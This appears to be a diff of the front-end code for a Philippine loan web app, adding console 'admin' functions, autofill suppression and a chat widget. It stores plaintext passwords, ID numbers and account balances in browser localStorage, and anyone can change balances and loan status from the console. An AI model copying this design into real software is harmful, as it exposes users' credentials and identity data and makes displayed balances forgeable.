+//  DISABLE BROWSER AUTOCOMPLETE AGGRESSIVELY
+// ============================================================
+function disableAutofill(){
+  document.querySelectorAll('input').forEach(inp=>{
+    inp.setAttribute('autocomplete','new-password');
+    inp.setAttribute('data-lpignore','true');
+    inp.setAttribute('data-form-type','other');
+  });
+}
 
-    function openPhotoModal(){ document.getElementById('photoModal').classList.remove('hidden'); }
-    function closePhotoModal(){ document.getElementById('photoModal').classList.add('hidden'); }
+// ============================================================
+//  STARTUP
+// ============================================================
+window.addEventListener('DOMContentLoaded',()=>{
+  initUsers();
+  disableAutofill();
+  checkPendingVerify();
+});
+</script>
 
-    document.addEventListener('click',e=>{ if(e.target.id==='photoModal') closePhotoModal(); });
-    document.addEventListener('keydown',e=>{ if(e.key==='Escape') closePhotoModal(); });
+<!-- ===================== ADMIN PANEL SCRIPT ===================== -->
+<!-- 
+  ADMIN USAGE:
+  Open browser console and run:
+  
+  // View all users:
+  adminViewUsers()
+  
+  // Manually update a user slot (e.g., slot 3):
+  adminSetUser(3, {email:"test@test.com", password:"abc123", balance:10000, loanStatus:"none", loanAmount:0, fullName:"Test User", idName:"Test User", idNumber:"123456"})
+  
+  // Reset all users to default:
+  adminReset()
+-->
+<script>
+// ADMIN FUNCTIONS (accessible from browser console)
+function adminViewUsers(){
+  const u=JSON.parse(localStorage.getItem('fsl_v5')||'{}');
+  console.table(Object.entries(u).map(([slot,data])=>({slot,...data})));
+  return u;
+}
+function adminSetUser(slot, data){
+  const u=JSON.parse(localStorage.getItem('fsl_v5')||'{}');
+  u[String(slot)]={...u[String(slot)],...data};
+  localStorage.setItem('fsl_v5',JSON.stringify(u));
+  users=u;
+  console.log(`✅ Slot ${slot} updated:`,u[String(slot)]);
+  return u[String(slot)];
+}
+function adminReset(){
+  localStorage.removeItem('fsl_v5');
+  location.reload();
+}
+function adminGetSlot(slot){
+  const u=JSON.parse(localStorage.getItem('fsl_v5')||'{}');
+  return u[String(slot)];
+}
+function adminClearSlot(slot){
+  return adminSetUser(slot,{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:""});
+}
+function adminAddBalance(slot,amount){
+  const u=JSON.parse(localStorage.getItem('fsl_v5')||'{}');
+  u[String(slot)].balance=(Number(u[String(slot)].balance||0)+amount);
+  localStorage.setItem('fsl_v5',JSON.stringify(u));
+  users=u;
+  if(currentSlot===String(slot)){ currentUser=users[currentSlot]; loadDashboard(); }
+  console.log(`✅ Added ₱${amount} to slot ${slot}. New balance: ₱${u[String(slot)].balance}`);
+}
+function adminSetLoanStatus(slot,status){
+  return adminSetUser(slot,{loanStatus:status});
+}
+console.log('%c🏦 FSL Admin Panel Ready','color:#f0b90b;font-size:16px;font-weight:bold;');
+console.log('%cCommands: adminViewUsers() | adminSetUser(slot,{...}) | adminAddBalance(slot,amount) | adminSetLoanStatus(slot,status) | adminReset()','color:#666;font-size:12px;');
+</script>
 
-    populateBanks();
-    document.getElementById('loginEmail').value='123fhffhf@gmail.com';
-    document.getElementById('loginPassword').value='12345678';
-    console.log('🚀 Fast & Safe Loans PH · Binance style ready');
-  </script>
+<!-- ===================== TAWK.TO CHAT ===================== -->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/64a7f5cc94cf5d49dc67eb87/1h4k7cg9d';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+
 </body>
 </html>
